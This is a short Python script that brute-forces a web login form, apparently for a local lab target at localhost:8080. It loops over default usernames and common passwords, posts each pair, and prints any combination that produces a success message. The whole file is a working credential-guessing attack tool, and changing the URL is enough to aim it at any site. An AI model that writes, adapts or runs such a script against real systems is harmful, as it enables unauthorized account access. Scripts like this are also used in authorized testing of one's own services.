import requests

default_passwords = ["admin", "password", "123456", "password123"]
default_usernames = ["admin", "user", "guest"]

url = "http://localhost:8080/login"

login_data = {
    "username": "",
    "password": ""
}

def try_login(username, password):
    login_data["username"] = username
    login_data["password"] = password
    response = requests.post(url, data=login_data)

    if "Login successful!" in response.text:
        print(f"Success: {username}:{password}")
        return True
    return False

def brute_force():
    for username in default_usernames:
        for password in default_passwords:
            print(f"Attempting {username}:{password}...")
            if try_login(username, password):
                return
            
if __name__ == "__main__":
    brute_force()